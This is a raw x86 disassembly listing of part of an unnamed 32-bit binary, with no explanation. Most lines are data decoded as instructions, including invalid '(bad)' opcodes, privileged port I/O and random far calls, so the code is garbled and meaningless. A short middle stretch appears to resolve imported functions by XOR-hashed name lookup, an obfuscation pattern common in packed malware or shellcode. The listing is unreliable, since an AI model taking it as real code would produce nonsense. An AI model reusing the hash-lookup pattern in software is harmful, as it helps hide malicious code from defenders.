  414943:	aam    0x65
  414945:	fild   QWORD PTR [edx-0x45e34e5d]
  41494b:	adc    al,0x67
  41494d:	dec    esi
  41494e:	xor    eax,0x5ccbd3e8
  414953:	push   esp
  414954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414955:	rcl    DWORD PTR [eax+edx*4],1
  414958:	dec    edx
  414959:	scas   al,BYTE PTR es:[edi]
  41495a:	pop    edx
  41495b:	and    dl,cl
  41495d:	pop    ecx
  41495e:	xlat   BYTE PTR ds:[ebx]
  41495f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414960:	popf   
  414961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414962:	sti    
  414963:	int    0x47
  414965:	lea    eax,[ecx+0x5c]
  414968:	sub    dl,bl
  41496a:	lds    esi,FWORD PTR [edi]
  41496c:	test   al,0xad
  41496e:	mov    edi,esi
  414970:	cld    
  414971:	sub    al,0x15
  414973:	pusha  
  414974:	add    al,0xa7
  414976:	add    esp,ebx
  414978:	add    esp,DWORD PTR [ebx]
  41497a:	mov    ds:0x273957df,al
  41497f:	jg     0x414993
  414981:	mov    bl,0xfa
  414983:	ins    BYTE PTR es:[edi],dx
  414984:	adc    ebx,edi
  414986:	call   0x81fb:0x2380d75a
  41498d:	mov    bh,0xaa
  41498f:	mov    al,ds:0x7e96b5
  414994:	lods   eax,DWORD PTR ds:[esi]
  414995:	sbb    edx,DWORD PTR ds:0x51843f76
  41499b:	imul   edi,DWORD PTR [esi],0x48
  41499e:	add    eax,DWORD PTR ds:0x8b8b650
  4149a4:	out    dx,al
  4149a5:	mov    eax,ds:0xc4fdc7ec
  4149aa:	pop    ebp
  4149ab:	pop    es
  4149ac:	inc    esp
  4149ad:	pushf  
  4149ae:	xchg   edi,eax
  4149af:	xor    BYTE PTR [ebp-0x5],ch
  4149b2:	fwait
  4149b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b5:	lahf   
  4149b6:	xchg   ebp,eax
  4149b7:	xchg   DWORD PTR [edi+0x4c],esi
  4149ba:	push   ds
  4149bb:	ja     0x414a06
  4149bd:	pop    esi
  4149be:	call   0x64d8:0x70dd9432
  4149c5:	jb     0x414967
  4149c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149c8:	dec    eax
  4149c9:	pop    esp
  4149ca:	outs   dx,BYTE PTR ds:[esi]
  4149cb:	add    BYTE PTR [edx+0x2a],0x72
  4149cf:	pushf  
  4149d0:	ret    
  4149d1:	xchg   ebp,eax
  4149d2:	jmp    0x6d95f55e
  4149d7:	push   edi
  4149d8:	adc    ch,BYTE PTR [ecx-0x7c]
  4149db:	push   es
  4149dc:	or     BYTE PTR [ecx-0x7e764c1a],dl
  4149e2:	sbb    edi,DWORD PTR [ecx]
  4149e4:	xor    al,0x85
  4149e6:	test   eax,0x33b85e8b
  4149eb:	jg     0x414a51
  4149ed:	outs   dx,DWORD PTR ds:[esi]
  4149ee:	pushf  
  4149ef:	xchg   ebx,eax
  4149f0:	repnz out 0xb8,eax
  4149f3:	jp     0x4149a0
  4149f5:	and    edi,ebx
  4149f7:	out    0xd3,al
  4149f9:	xor    BYTE PTR [esi-0x34e52410],al
  4149ff:	push   es
  414a00:	dec    ebp
  414a01:	add    eax,0x20a0f9e6
  414a06:	lahf   
  414a07:	dec    esi
  414a08:	aas    
  414a09:	sub    BYTE PTR [eiz*8-0x38a25fbe],cl
  414a10:	add    eax,0x400f185
  414a15:	mov    eax,ds:0xa651112a
  414a1a:	lahf   
  414a1b:	inc    ebp
  414a1c:	loope  0x414a3d
  414a1e:	pop    edi
  414a1f:	mov    edi,0xbfc17fb
  414a24:	inc    edi
  414a25:	mov    WORD PTR [ecx+0x62],?
  414a28:	inc    ebp
  414a29:	ins    BYTE PTR es:[edi],dx
  414a2a:	mov    ah,0x5a
  414a2c:	jne    0x414a53
  414a2e:	dec    ebp
  414a2f:	dec    esp
  414a30:	mov    ah,dh
  414a32:	xor    DWORD PTR [eax+0x734889b1],ebx
  414a38:	jno    0x4149fb
  414a3a:	mov    esp,DWORD PTR [ebx+0x79]
  414a3d:	or     ebp,DWORD PTR [ecx]
  414a3f:	push   cs
  414a40:	jl     0x414a95
  414a42:	dec    esi
  414a43:	cmp    eax,edx
  414a45:	push   esi
  414a46:	les    edx,FWORD PTR [ebp+eiz*8+0x26]
  414a4a:	jno    0x414a66
  414a4c:	pop    edi
  414a4d:	je     0x4149fb
  414a4f:	scas   eax,DWORD PTR es:[edi]
  414a50:	pop    edx
  414a51:	aad    0x9e
  414a53:	daa    
  414a54:	push   0x7918f2c
  414a59:	dec    ecx
  414a5a:	adc    DWORD PTR [esi-0x5],esi
  414a5d:	jb     0x414a07
  414a5f:	mov    esi,0xbdc5b29b
  414a64:	dec    esp
  414a65:	push   esi
  414a66:	cdq    
  414a67:	stc    
  414a68:	popf   
  414a69:	mov    bh,0x2c
  414a6b:	fild   DWORD PTR [eax+0x6b421e43]
  414a71:	add    DWORD PTR ds:0x9110,ebp
  414a76:	and    bh,dh
  414a78:	ja     0x414a56
  414a7a:	inc    edi
  414a7b:	add    DWORD PTR [ebp+0x4c],edi
  414a7e:	stos   DWORD PTR es:[edi],eax
  414a7f:	cld    
  414a80:	jnp    0x414a76
  414a82:	mov    BYTE PTR [esi+0x607b0e86],dl
  414a88:	dec    esi
  414a89:	dec    ebx
  414a8a:	mov    eax,0x10cf1aea
  414a8f:	jbe    0x414a3c
  414a91:	ret    0x8449
  414a94:	(bad)
  414a97:	add    ebx,0x5c
  414a9a:	pop    ecx
  414a9b:	and    al,0x60
  414a9d:	sub    ah,BYTE PTR ds:0x9063b551
  414aa3:	inc    esp
  414aa4:	adc    DWORD PTR [edx+0x63],0xe866369c
  414aab:	arpl   WORD PTR [ecx-0x2a],sp
  414aae:	imul   ebp,DWORD PTR [ebx-0x36],0xa4cfd0ea
  414ab5:	pop    esi
  414ab6:	shl    BYTE PTR ds:0x1c7fe85,cl
  414abc:	jl     0x414a88
  414abe:	xchg   esi,eax
  414abf:	cmp    al,ah
  414ac1:	mov    eax,ds:0xc0778f5f
  414ac6:	std    
  414ac7:	xchg   DWORD PTR [eax+0x7931a57],eax
  414acd:	or     DWORD PTR [edi+0x38],edi
  414ad0:	cmp    ebp,DWORD PTR [edx+0x5bde0d23]
  414ad6:	jbe    0x414b3e
  414ad8:	loop   0x414a61
  414ada:	(bad)  
  414adb:	sbb    al,BYTE PTR [edi]
  414add:	shr    esp,0x9f
  414ae0:	sub    al,0xa5
  414ae2:	and    al,0x7
  414ae4:	hlt    
  414ae5:	adc    al,0xb9
  414ae7:	in     al,dx
  414ae8:	movq   mm0,QWORD PTR [ebx+ebp*4+0x4d56a0d2]
  414af0:	and    BYTE PTR [edx],ch
  414af2:	jle    0x414b37
  414af4:	fs sub bh,bh
  414af7:	pop    edx
  414af8:	(bad)  
  414af9:	jno    0x414b52
  414afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414afc:	dec    esi
  414afd:	and    esp,ebx
  414aff:	call   0x72ee:0xf29bcad5
  414b06:	aaa    
  414b07:	push   0x70da70f6
  414b0c:	and    BYTE PTR [ebx-0x5bf0fee2],dl
  414b12:	lods   eax,DWORD PTR ds:[esi]
  414b13:	loope  0x414b0a
  414b15:	popf   
  414b16:	add    esp,DWORD PTR [eax+0x6f]
  414b19:	push   esp
  414b1a:	adc    DWORD PTR [ecx+edi*1+0x108a2145],esp
  414b21:	add    al,0xcc
  414b23:	mov    esi,eax
  414b25:	and    esp,DWORD PTR [edi+0x23]
  414b28:	lock and edx,DWORD PTR [eax+0x36]
  414b2c:	pop    esi
  414b2d:	mov    eax,eax
  414b2f:	loopne 0x414ab3
  414b31:	xor    eax,0x3bc303d3
  414b36:	enter  0x850f,0x1d
  414b3a:	add    BYTE PTR [eax],al
  414b3c:	add    BYTE PTR [ebx+0x3b47e045],cl
  414b42:	clc    
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	cmp    ah,0x26
  414bb9:	ss pop ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b7a
  414bc3:	hlt    
  414bc4:	(bad)
  414bc7:	pop    esi
  414bc8:	pmaxub mm0,QWORD PTR [edi]
  414bcb:	sbb    bh,BYTE PTR [ebx-0x7e]
  414bce:	int3   
  414bcf:	out    dx,eax
  414bd0:	dec    ebx
  414bd1:	rcl    DWORD PTR [ecx+ebx*8+0x79ec7a92],1
  414bd8:	arpl   WORD PTR [ebp+0x4a1cb6da],ax
  414bde:	sbb    ecx,DWORD PTR [ebp+0x1d]
  414be1:	sub    DWORD PTR [esi-0x5e58a84a],eax
  414be7:	or     bl,dh
  414be9:	xor    edi,edx
  414beb:	ins    DWORD PTR es:[edi],dx
  414bec:	sbb    esp,DWORD PTR [esi-0xa6b1530]
  414bf2:	daa    
  414bf3:	aam    0xee
  414bf5:	out    0x23,al
  414bf7:	mov    al,0x61
  414bf9:	ror    BYTE PTR [ecx],cl
  414bfb:	adc    dh,BYTE PTR [esi+0x7d59d498]
  414c01:	pusha  
  414c02:	enter  0xb0fb,0x8b
  414c06:	repnz aam 0x74
  414c09:	fnstenv [edi+0x6c]
  414c0c:	into   
  414c0d:	jb     0x414b93
  414c0f:	aaa    
  414c10:	jae    0x414c62
  414c12:	out    dx,eax
  414c13:	push   ebp
  414c14:	dec    eax
  414c15:	icebp  
  414c16:	dec    ebp
  414c17:	cs out dx,eax
  414c19:	mov    edx,0x8bc3d8a0
  414c1e:	cmc    
  414c1f:	cld    
  414c20:	clc    
  414c21:	push   edx
  414c22:	lahf   
  414c23:	cmp    DWORD PTR [esi-0xd],ebp
  414c26:	mov    dl,0x29
  414c28:	cwde   
  414c29:	std    
  414c2a:	(bad)
  414c2f:	and    DWORD PTR [edi-0x2f],eax
  414c32:	out    dx,eax
  414c33:	pop    edx
  414c34:	out    0x70,al
  414c36:	ins    BYTE PTR es:[edi],dx
  414c37:	fdiv   st(5),st
  414c39:	repnz fstp DWORD PTR [ebp+0xd0637d4]
  414c40:	js     0x414c40
  414c42:	mov    eax,0xe3a5db24
  414c47:	and    DWORD PTR [ebx],edi
  414c49:	fs repnz in al,0xed
  414c4d:	retf   
  414c4e:	pop    ss
  414c4f:	jmp    0x414c1c
  414c51:	and    eax,0x41034e63
  414c56:	loope  0x414c9f
  414c58:	inc    esi
  414c59:	dec    ebx
  414c5a:	mov    cl,0x14
  414c5d:	lahf   
  414c5e:	loope  0x414c29
  414c60:	cmp    DWORD PTR [ebx+0x4de4f18e],eax
  414c66:	jae    0x414c67
  414c68:	pop    es
  414c69:	call   0x26d6:0x64ad80e2
  414c70:	fmul   st,st(7)
  414c72:	mov    edx,0xad75d38e
  414c77:	sbb    al,0x79
  414c79:	sbb    ecx,DWORD PTR [ebp-0xc53cdb]
  414c7f:	ja     0x414c06
  414c81:	rcl    esi,cl
  414c83:	mov    al,0xee
  414c85:	call   0x1ed1:0x191b9a47
  414c8c:	in     eax,0xac
  414c8e:	retf   
  414c8f:	outs   dx,BYTE PTR ds:[esi]
  414c90:	xor    ebx,DWORD PTR [eax]
  414c92:	pop    edi
  414c93:	loopne 0x414cd7
  414c95:	into   
  414c96:	fwait
  414c97:	dec    eax
  414c98:	(bad)  
  414c99:	sub    al,0x51
  414c9b:	pop    esp
  414c9c:	es dec ecx
  414c9e:	aam    0xdc
  414ca0:	dec    edx
  414ca1:	nop
  414ca2:	cld    
  414ca3:	std    
  414ca4:	daa    
  414ca5:	arpl   cx,ax
  414ca7:	retf   
  414ca8:	leave  
  414ca9:	out    0x14,eax
  414cab:	xchg   BYTE PTR [edi+0x37],ah
  414cae:	fstp   TBYTE PTR [eax-0x3120e5f3]
  414cb4:	push   ds
  414cb5:	cli    
  414cb6:	inc    ebx
  414cb7:	aas    
  414cb8:	lds    edx,FWORD PTR [ecx+0x2c]
  414cbb:	ret    
  414cbc:	dec    eax
  414cbd:	mov    ch,0x43
  414cbf:	scas   al,BYTE PTR es:[edi]
  414cc0:	aad    0x25
  414cc2:	cmp    ecx,DWORD PTR [eax]
  414cc4:	push   ebx
  414cc5:	jle    0x414c94
  414cc7:	mov    DWORD PTR [edi],esi
  414cc9:	test   eax,0x19064b53
  414cce:	dec    edi
  414ccf:	xchg   ebx,eax
  414cd0:	addr16 mov esi,gs
  414cd3:	aas    
  414cd4:	test   al,0x83
  414cd6:	arpl   WORD PTR [ebp+0x20b4f28d],bp
  414cdc:	xchg   BYTE PTR [esi+0x5d],bl
  414cdf:	imul   edx,DWORD PTR [ecx+0x1],0xffffffa5
  414ce3:	in     eax,dx
  414ce4:	mov    edx,0x3f25ccc2
  414ce9:	es inc eax
  414ceb:	sub    ebp,ebp
  414ced:	enter  0x150e,0xda
  414cf1:	stos   BYTE PTR es:[edi],al
  414cf2:	mov    BYTE PTR [eax],dh
  414cf4:	ror    BYTE PTR [ecx],0xf6
  414cf7:	(bad)  
  414cf8:	ror    DWORD PTR [eax],cl
  414cfa:	das    
  414cfb:	cmc    
  414cfc:	xchg   edx,eax
  414cfd:	int3   
  414cfe:	jne    0x414c9d
  414d00:	inc    ecx
  414d01:	adc    edi,0x67
  414d04:	int3   
  414d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d06:	jne    0x414d70
  414d08:	jp     0x414cb4
  414d0a:	sbb    DWORD PTR [eax-0x59],eax
  414d0d:	iret   
  414d0e:	mov    DWORD PTR [esi+0x33b9a392],ebx
  414d14:	aam    0x8c
  414d16:	scas   al,BYTE PTR es:[edi]
  414d17:	ret    
  414d18:	mov    al,BYTE PTR [ebp+0x5d132698]
  414d1e:	xchg   edi,eax
  414d1f:	lea    edi,[ebx+ecx*8]
  414d22:	out    dx,eax
  414d23:	mov    ebx,0x3d548eaa
  414d28:	out    0xc9,al
  414d2a:	add    DWORD PTR [edi-0x77],edi
  414d2d:	dec    edx
  414d2e:	adc    BYTE PTR [edi+0x22],cl
  414d31:	mov    al,0xe9
  414d33:	fist   WORD PTR [ebp+0x68b5b42f]
  414d39:	sbb    eax,0x3429565a
  414d3e:	dec    ebp
  414d3f:	ss inc ebx
  414d41:	pop    esp
  414d42:	lock mov ah,0xb2
  414d45:	loope  0x414ce5
  414d47:	ss loopne 0x414ceb
  414d4a:	or     eax,0x669d08aa
  414d4f:	add    cl,BYTE PTR [ebx]
  414d51:	pusha  
  414d52:	ret    
  414d53:	mov    al,BYTE PTR [edx-0x1c112c69]
  414d59:	push   esi
  414d5a:	cs scas al,BYTE PTR es:[edi]
  414d5c:	dec    ebp
  414d5d:	sub    esp,DWORD PTR [ebx+0x2809b448]
  414d63:	xor    bh,0x8d
  414d66:	mov    DWORD PTR ds:0x12f3483,eax
  414d6c:	pop    es
  414d6d:	popf   
  414d6e:	dec    esi
  414d6f:	jmp    0x441f:0x1bb43b39
  414d76:	sub    eax,0x204b8c86
  414d7b:	push   ebp
  414d7c:	mov    ch,0x93
  414d7e:	pushf  
  414d7f:	mov    al,ds:0x23938681
  414d84:	pop    edi
  414d85:	outs   dx,DWORD PTR ds:[esi]
  414d86:	mov    ?,edx
  414d88:	loopne 0x414dd5
  414d8a:	pop    ss
  414d8b:	push   ss
  414d8c:	int    0xf9
  414d8e:	sub    ah,ch
  414d90:	mov    ch,0x6a
  414d92:	dec    ax
  414d94:	dec    ebp
  414d95:	pop    esi
  414d96:	retf   0x5c89
  414d99:	sbb    eax,0x316f36e8
  414d9e:	push   ss
  414d9f:	pop    edx
  414da0:	cli    
  414da1:	test   DWORD PTR [edx],esi
  414da3:	sub    dh,BYTE PTR [eax-0x7ade6a9c]
  414da9:	fidiv  WORD PTR [ecx]
  414dab:	out    dx,eax
  414dac:	loop   0x414e0b
  414dae:	add    BYTE PTR [esi+0xd],ch
  414db1:	pop    es
  414db2:	and    BYTE PTR [eax+0x665a1e96],dh
  414db8:	pop    esi
  414db9:	lods   eax,DWORD PTR ds:[esi]
  414dba:	push   esp
  414dbb:	sub    dl,ah
  414dbd:	pop    esp
  414dbe:	mov    al,0xf2
  414dc0:	push   0xffffffa5
  414dc2:	popa   
  414dc3:	iret   
  414dc4:	pop    edi
  414dc5:	dec    esp
  414dc6:	(bad)  
  414dc8:	and    edi,DWORD PTR [eax]
  414dca:	adc    ebx,ebp
  414dcc:	fcomip st,st(3)
  414dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dcf:	outs   dx,DWORD PTR ds:[esi]
  414dd0:	ds push 0x67
  414dd3:	sbb    al,0xc
  414dd5:	mov    bl,0x8
  414dd7:	xchg   edi,eax
  414dd8:	adc    ch,bh
  414dda:	push   eax
  414ddb:	js     0x414d79
  414ddd:	cwde   
  414dde:	iret   
  414ddf:	xchg   ecx,eax
  414de0:	mov    cl,0x6
  414de2:	aad    0xc5
  414de4:	mov    BYTE PTR [edi],dh
  414de6:	adc    BYTE PTR [ebx+0x6f5bd259],bh
  414dec:	jle    0x414e3d
  414dee:	loope  0x414d9e
  414df0:	ficom  WORD PTR [ecx]
  414df2:	arpl   WORD PTR [eax-0x483cf4d6],ax
  414df8:	mov    ch,0xef
  414dfa:	enter  0x5aee,0xb2
  414dfe:	mov    cl,0x60
  414e00:	add    al,0xe6
  414e02:	pop    ss
  414e03:	and    al,0xac
  414e05:	mov    ebx,0x1dc8c607
  414e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e0b:	dec    ebx
  414e0c:	sbb    ebx,DWORD PTR es:[edi-0x17540213]
  414e13:	(bad)  
  414e14:	in     al,dx
  414e15:	gs cdq 
  414e17:	retf   0xcb5a
  414e1a:	retf   
  414e1b:	or     al,BYTE PTR [ebp+0xb]
  414e1e:	test   edi,esi
  414e20:	repz inc DWORD PTR [edi+ebp*8+0x3fbe56d4]
  414e28:	jp     0x414e2d
  414e2a:	adc    ch,bh
  414e2c:	dec    edx
  414e2d:	(bad)  [edx+eax*8]
  414e30:	sbb    BYTE PTR [ecx-0x57d28858],bl
  414e36:	adc    al,0x2e
  414e38:	push   esp
  414e39:	into   
  414e3a:	mov    BYTE PTR [eax],bl
  414e3c:	jmp    0x414e9d
  414e3e:	scas   eax,DWORD PTR es:[edi]
  414e3f:	push   esp
  414e40:	loopne 0x414e11
  414e42:	or     ah,BYTE PTR [esi+0x14]
  414e45:	dec    edi
  414e46:	sub    BYTE PTR [esi-0x59345b1f],al
  414e4c:	data16 adc bl,BYTE PTR [ebx+0x6fd937c2]
  414e53:	or     ecx,ebx
  414e55:	cmp    eax,0xee5de704
  414e5a:	dec    eax
  414e5b:	mov    ss,WORD PTR [ebx-0x6d1b824f]
  414e61:	ds stos BYTE PTR es:[edi],al
  414e63:	jge    0x414e48
  414e65:	popa   
  414e66:	sbb    al,0x1d
  414e68:	scas   al,BYTE PTR es:[edi]
  414e69:	retf   
  414e6a:	sub    ch,BYTE PTR [ecx+eiz*2]
  414e6d:	push   esi
  414e6e:	xor    al,0xb1
  414e70:	xchg   DWORD PTR [eax],ebx
  414e72:	inc    ecx
  414e73:	cmp    DWORD PTR [ebx+eax*1+0x39],esp
  414e77:	(bad)  
  414e78:	sbb    BYTE PTR [esi-0x30c779fb],bl
  414e7e:	push   0xfffffff9
  414e80:	lods   eax,DWORD PTR ds:[esi]
  414e81:	and    cl,BYTE PTR [edx+0x49e8f0ed]
  414e87:	add    ch,BYTE PTR [edi]
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	sub    ch,BYTE PTR [edx-0x2c]
  414eaf:	or     esp,DWORD PTR [eax+edi*2+0x7eb9707f]
  414eb6:	jo     0x414f28
  414eb8:	dec    esi
  414eb9:	sbb    cl,BYTE PTR ds:0x58ef159a
  414ebf:	and    al,BYTE PTR [ebp+0x41]
  414ec2:	imul   esp,DWORD PTR [ebx-0x76],0x597b316e
  414ec9:	stos   BYTE PTR es:[edi],al
  414eca:	xor    bl,bh
  414ecc:	leave  
  414ecd:	fdivr  QWORD PTR [esi+0x18]
  414ed0:	cmp    BYTE PTR [eax-0x48],0x54
  414ed4:	mov    eax,ds:0xab21a51f
  414ed9:	jecxz  0x414f00
  414edb:	add    ecx,edi
  414edd:	imul   eax,DWORD PTR [eax+0x7e7afc6a],0xffffff9f
  414ee4:	cli    
  414ee5:	or     DWORD PTR [ebp-0x35],0x4f49a6bd
  414eec:	jp     0x414efd
  414eee:	jmp    0x3492:0x393d7065
  414ef5:	sub    al,0xce
  414ef7:	popa   
  414ef8:	cwde   
  414ef9:	add    al,0x9a
  414efb:	sahf   
  414efc:	jp     0x414ed9
  414efe:	test   esp,esp
  414f00:	aad    0xee
  414f02:	pop    es
  414f03:	inc    esp
  414f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f05:	pop    fs
  414f07:	inc    edx
  414f08:	in     al,0xc7
  414f0a:	or     DWORD PTR [edx],ebp
  414f0c:	xchg   esp,eax
  414f0d:	cmp    esp,0x49a262f
  414f13:	pop    es
  414f14:	cmp    BYTE PTR [ebp+0x3291fd4c],cl
  414f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1b:	mov    bl,BYTE PTR [esi]
  414f1d:	jb     0x414f7f
  414f1f:	push   ebp
  414f20:	or     DWORD PTR [edx+0x3c8ce98c],ebx
  414f26:	mov    eax,ds:0xbd502285
  414f2b:	mov    cx,0x1a8e
  414f2f:	gs mov bh,0x5e
  414f32:	add    eax,0xc4d50474
  414f37:	xchg   esp,eax
  414f38:	adc    eax,0x8e9c00cf
  414f3d:	pop    esp
  414f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f3f:	jae    0x414ed6
  414f41:	xor    DWORD PTR [ebx-0x51],ecx
  414f44:	sub    bl,dl
  414f46:	scas   al,BYTE PTR es:[edi]
  414f47:	add    DWORD PTR [ebx-0x28],eax
  414f4a:	pop    ss
  414f4b:	dec    esi
  414f4c:	sbb    DWORD PTR [ecx-0x530e171a],ecx
  414f52:	into   
  414f53:	retf   
  414f54:	or     eax,DWORD PTR [ebx]
  414f56:	xchg   edx,eax
  414f57:	xchg   ecx,eax
  414f58:	jbe    0x414fc3
  414f5a:	scas   eax,DWORD PTR es:[edi]
  414f5b:	(bad)
  414f5f:	pop    ss
  414f60:	mov    ebp,0x33fd0956
  414f65:	retf   
  414f66:	stos   DWORD PTR es:[edi],eax
  414f67:	nop
  414f68:	xor    BYTE PTR [edx+0x44e77430],0x6d
  414f6f:	pop    ebp
  414f70:	leave  
  414f71:	iret   
  414f72:	dec    ebp
  414f73:	sbb    BYTE PTR [ebp+0xd50be07],cl
  414f79:	adc    al,0xc8
  414f7b:	jb     0x414fd8
  414f7d:	xor    eax,0x74ae201c
  414f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f83:	and    al,0x8f
  414f85:	pop    eax
  414f86:	adc    bh,BYTE PTR [edi+0x7c91579d]
  414f8c:	lods   al,BYTE PTR ds:[esi]
  414f8d:	mov    esp,DWORD PTR ds:0x8c33f84
  414f93:	mov    ch,0xea
  414f95:	xchg   ecx,eax
  414f96:	xor    eax,0x52bb17f7
  414f9b:	mov    dh,0xff
  414f9d:	pop    esi
  414f9e:	inc    esi
  414f9f:	mov    DWORD PTR [edi-0x745bed9c],esi
  414fa5:	stos   DWORD PTR es:[edi],eax
  414fa6:	dec    edx
  414fa7:	cli    
  414fa8:	test   ah,al
  414faa:	pop    esp
  414fab:	push   ebx
  414fac:	xlat   BYTE PTR ds:[ebx]
  414fad:	imul   ebx,ecx,0x20fc32a6
  414fb3:	xchg   edx,eax
  414fb4:	cli    
  414fb5:	cwde   
  414fb6:	pusha  
  414fb7:	and    dl,bh
  414fb9:	xor    DWORD PTR [edx-0x6c4f1cbc],eax
  414fbf:	jge    0x414f7b
  414fc1:	aas    
  414fc2:	or     eax,eax
  414fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc5:	and    ebp,DWORD PTR [eax]
  414fc7:	xchg   edi,eax
  414fc8:	lods   eax,DWORD PTR ds:[esi]
  414fc9:	outs   dx,DWORD PTR ds:[esi]
  414fca:	lea    ebp,[edi+0x318d5497]
  414fd0:	add    al,al
  414fd2:	jg     0x414f8b
  414fd4:	dec    ebx
  414fd5:	push   ebx
  414fd6:	jle    0x414ff7
  414fd8:	adc    esp,DWORD PTR [edi*8-0x24a895e5]
  414fdf:	add    al,0x7
  414fe1:	rol    DWORD PTR [ecx],1
  414fe3:	arpl   dx,dx
  414fe5:	push   esi
  414fe6:	loope  0x415024
  414fe8:	stos   DWORD PTR es:[edi],eax
  414fe9:	xchg   esp,eax
  414fea:	fldenv [eax-0x3f45320b]
  414ff0:	(bad)  
  414ff2:	xor    eax,0x1046b656
  414ff7:	add    eax,DWORD PTR [ecx]
  414ff9:	imul   ebp,DWORD PTR gs:[ebp-0x7f53a3f2],0x8466dbdf
  415004:	pop    ebx
  415005:	jnp    0x41507e
  415007:	(bad)  
  415008:	cmp    ebp,DWORD PTR [edi]
  41500a:	stos   DWORD PTR es:[edi],eax
  41500b:	stos   DWORD PTR es:[edi],eax
  41500c:	mov    al,0x44
  41500e:	cmp    ecx,ecx
  415010:	jp     0x415064
  415012:	int    0x3e
  415014:	sbb    ebx,DWORD PTR [edi]
  415016:	inc    ecx
  415017:	fmulp  st(0),st
  415019:	iret   
  41501a:	jo     0x414fbf
  41501c:	pushf  
  41501d:	scas   eax,DWORD PTR es:[edi]
  41501e:	adc    al,0xce
  415020:	out    0x46,eax
  415022:	inc    ebp
  415023:	or     DWORD PTR [ebx+0x14fb2cc4],ecx
  415029:	stos   DWORD PTR es:[edi],eax
  41502a:	cmp    DWORD PTR [esi],0x4b
  41502d:	lods   al,BYTE PTR ds:[esi]
  41502e:	push   cs
  41502f:	cmp    eax,0x21a43565
  415034:	inc    edi
  415035:	or     ch,BYTE PTR [ecx+0xca2a3b2]
  41503b:	call   0xb2a1:0xa97a479f
  415042:	add    ebx,ebp
  415044:	lods   al,BYTE PTR ds:[esi]
  415045:	mov    eax,DWORD PTR [ebx-0x498eb219]
  41504b:	cmp    esp,0xc66123c2
  415051:	jne    0x415098
  415053:	mov    eax,0x228d3cc1
  415058:	out    dx,al
  415059:	dec    edi
  41505a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41505b:	cmp    ebx,0xffffffad
  41505e:	xor    BYTE PTR [edx+0x49376b19],ah
  415064:	mov    ds:0x7db1471f,al
  415069:	es xor al,0x41
  41506c:	inc    esi
  41506d:	inc    eax
  41506e:	rcr    BYTE PTR [edx-0x76],0xe1
  415072:	lods   eax,DWORD PTR ds:[esi]
  415073:	jno    0x41505a
  415075:	push   edi
  415076:	jbe    0x415099
  415078:	inc    eax
  415079:	adc    BYTE PTR [ebx],dh
  41507b:	xor    DWORD PTR [ecx+0x78],ebx
  41507e:	xor    DWORD PTR [edx],esi
  415080:	cmp    BYTE PTR [edx+0x26],bh
  415083:	pop    ds
  415084:	mov    WORD PTR [ecx],es
  415086:	loopne 0x415008
  415088:	lock mov ebx,0xdbd4dffc
  41508e:	and    eax,DWORD PTR [ebp+ebp*2+0x45f18319]
  415095:	idiv   esi
  415097:	jb     0x4150a1
  415099:	popa   
  41509a:	xor    ecx,DWORD PTR [ecx-0x22be5953]
  4150a0:	loope  0x415045
  4150a2:	stos   BYTE PTR es:[edi],al
  4150a3:	jnp    0x41503d
  4150a5:	aad    0xe7
  4150a7:	sub    eax,0x4261d72e
  4150ac:	fst    DWORD PTR [ebx]
  4150ae:	scas   eax,DWORD PTR es:[edi]
  4150af:	iret   
